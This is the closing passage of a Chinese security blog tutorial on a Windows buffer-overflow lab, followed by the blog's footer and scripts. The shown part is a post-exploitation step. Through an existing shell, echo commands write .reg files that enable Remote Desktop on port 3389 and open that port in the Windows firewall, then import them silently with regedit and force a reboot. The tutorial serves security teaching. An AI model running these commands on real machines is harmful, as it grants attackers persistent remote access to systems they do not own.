class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">**C:\** **&gt; regedit /s 3389.reg</span><br><span class="line">regedit /s 3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;shutdown -r -t 0</span><br><span class="line">shutdown -r -t 0**</span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128115127073-478057944.png" /></p>
+<p><strong>防火墙开启远程桌面（通过现有shell，修改注册表开启）</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128133344544-902451314.png" /></p>
+<p><strong>通过 RegSnap 抓取修改上图中的Remote Desktop
+前后注册表变化，确定所需修改的注册表值，然后通过上面类似操作远程修改，重启即可）</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128134230552-1974109396.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128135511726-1676909492.png" /></p>
+<p><strong>3389_firewall.reg</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]</span><br><span class="line"><span class="string">&quot;3389:TCP&quot;</span>=<span class="string">&quot;3389:TCP:*:Enabled:@xpsp2res.dll,-22009&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>执行前：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128140724098-55431327.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128140756961-1163279134.png" /></p>
+<p><strong>执行：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389_firewall.reg</span><br><span class="line"><span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]&gt;&gt;3389_firewall.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]&gt;&gt;3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;3389:TCP&quot;</span>=<span class="string">&quot;3389:TCP:*:Enabled:@xpsp2res.dll,-22009&quot;</span>&gt;&gt;3389_firewall.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;3389:TCP&quot;</span>=<span class="string">&quot;3389:TCP:*:Enabled:@xpsp2res.dll,-22009&quot;</span>&gt;&gt;3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;regedit /s 3389_firewall.reg</span><br><span class="line">regedit /s 3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;shutdown -r -t 0</span><br><span class="line">shutdown -r -t 0</span><br></pre></td></tr></table></figure>
+<p><strong>结果：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128142129878-715530988.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128142422955-709770562.png" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/" title="缓冲区溢出之WINDOWS实例">https://z9m8r8.github.io/2022/01/28/缓冲区溢出之WINDOWS实例/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 缓冲区溢出</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/26/NEXPOSE/" rel="prev" title="NEXPOSE">
+                  <i class="fa fa-angle-left"></i> NEXPOSE
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/01/31/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BLINUX%E5%AE%9E%E4%BE%8B/" rel="next" title="缓冲区溢出之LINUX实例 ">
+                  缓冲区溢出之LINUX实例  <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
